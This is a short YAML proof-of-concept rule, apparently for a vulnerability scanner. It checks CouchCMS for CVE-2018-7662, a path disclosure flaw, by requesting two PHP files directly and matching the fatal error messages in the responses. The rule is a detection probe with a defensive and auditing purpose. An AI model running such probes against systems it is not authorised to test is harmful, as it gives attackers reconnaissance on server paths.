name: poc-yaml-couchcms-cve-2018-7662
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /includes/mysql2i/mysql2i.func.php
            follow_redirects: false
        expression: 'response.status == 200 && response.body.bcontains(b"mysql2i.func.php on line 10") && response.body.bcontains(b"Fatal error: Cannot redeclare mysql_affected_rows() in")'
    r1:
        request:
            cache: true
            method: GET
            path: /addons/phpmailer/phpmailer.php
            follow_redirects: false
        expression: 'response.status == 200 && response.body.bcontains(b"phpmailer.php on line 10") && response.body.bcontains(b"Fatal error: Call to a menber function add_event_listener() on a non-object in")'
expression: r0() && r1()
detail:
    author: we1x4n(https://we1x4n.github.io/)
    links:
        - https://github.com/CouchCMS/CouchCMS/issues/46
